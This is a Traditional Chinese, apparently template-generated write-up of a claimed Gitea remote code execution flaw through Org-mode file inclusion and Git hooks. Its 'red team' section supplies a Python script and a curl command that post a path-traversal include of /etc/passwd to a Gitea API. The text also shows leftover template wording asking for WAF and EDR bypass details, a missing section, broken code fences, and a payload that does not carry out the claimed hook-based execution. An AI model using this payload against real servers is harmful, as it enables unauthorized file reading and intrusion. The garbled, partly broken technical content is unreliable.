# 🚨 解析 Gitea CVE-2026-59774 遠端命令執行漏洞
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 3.1 風險評分達 9.8 分)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Org-mode` 文件處理、`Git hook` 執行

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Gitea 處理 `Org-mode` 文件的方式中，沒有阻止從指定路徑載入其他檔案的功能，導致攻擊者可以送出特製內容，要求 Gitea 替他讀取原本不該對外公開的檔案。
* **攻擊流程圖解**: 
    1. 攻擊者發送特製的 `Org-mode` 文件到 Gitea 伺服器。
    2. Gitea 處理 `Org-mode` 文件時，載入其他檔案的功能被觸發。
    3. 攻擊者可以讀取原本不該對外公開的檔案，例如系統主要設定檔中的內部存取權杖。
    4. 攻擊者利用內部存取權杖，寫入 Git hook，讓 Git 在特定操作發生時自動執行指定指令。
* **受影響元件**: Gitea 1.22.1 至 1.27.0 版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要找到一個可公開存取的儲存庫。
* **Payload 建構邏輯**:

    ```
    
    python
    # 範例 Payload
    org_mode_file = """
    #+INCLUDE: ../../../../../../etc/passwd
    """
    # 送出 Payload 到 Gitea 伺服器
    import requests
    response = requests.post('https://example.com/api/v1/repos/username/repo/contents/path/to/file', 
                                headers={'Content-Type': 'application/json'}, 
                                json={'content': org_mode_file})
    
    ```
    * **範例指令**: 使用 `curl` 送出 Payload。

```

bash
curl -X POST \
  https://example.com/api/v1/repos/username/repo/contents/path/to/file \
  -H 'Content-Type: application/json' \
  -d '{"content": "#+INCLUDE: ../../../../../../etc/passwd"}'

```
* **繞過技術**: 如果有 WAF 或 EDR 繞過技巧，請務必詳述。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Org-mode**: 一種文件格式，支援從指定路徑載入其他檔案。
* **Git hook**: Git 在特定操作發生時自動執行指定指令的機制。
* **內部存取權杖**: 一種用於驗證身份的 token，通常用於授權存取系統資源。
